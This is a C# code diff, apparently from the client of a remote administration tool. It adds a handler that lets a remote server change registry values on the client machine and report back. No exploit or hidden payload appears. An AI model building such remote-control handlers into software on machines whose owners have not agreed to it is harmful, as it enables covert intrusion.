@@ -140,8 +140,7 @@ namespace xClient.Core.Commands
                 errorMsg = ex.Message;
             }
             responsePacket.ErrorMsg = errorMsg;
-            object valueData = packet.Kind.GetDefault();
-            responsePacket.Value = new RegValueData(newKeyName, packet.Kind.RegistryTypeToString(), packet.Kind.RegistryTypeToString(valueData));
+            responsePacket.Value = new RegValueData(newKeyName, packet.Kind, packet.Kind.GetDefault());
             responsePacket.KeyPath = packet.KeyPath;
 
             responsePacket.Execute(client);
@@ -184,6 +183,26 @@ namespace xClient.Core.Commands
             responsePacket.KeyPath = packet.KeyPath;
             responsePacket.OldValueName = packet.OldValueName;
             responsePacket.NewValueName = packet.NewValueName;
+
+            responsePacket.Execute(client);
+        }
+
+        public static void HandleChangeRegistryValue(xClient.Core.Packets.ServerPackets.DoChangeRegistryValue packet, Client client)
+        {
+            xClient.Core.Packets.ClientPackets.GetChangeRegistryValueResponse responsePacket = new Packets.ClientPackets.GetChangeRegistryValueResponse();
+            string errorMsg = "";
+            try
+            {
+                responsePacket.IsError = !(RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg));
+            }
+            catch (Exception ex)
+            {
+                responsePacket.IsError = true;
+                errorMsg = ex.Message;
+            }
+            responsePacket.ErrorMsg = errorMsg;
+            responsePacket.KeyPath = packet.KeyPath;
+            responsePacket.Value = packet.Value;
 
             responsePacket.Execute(client);
         }
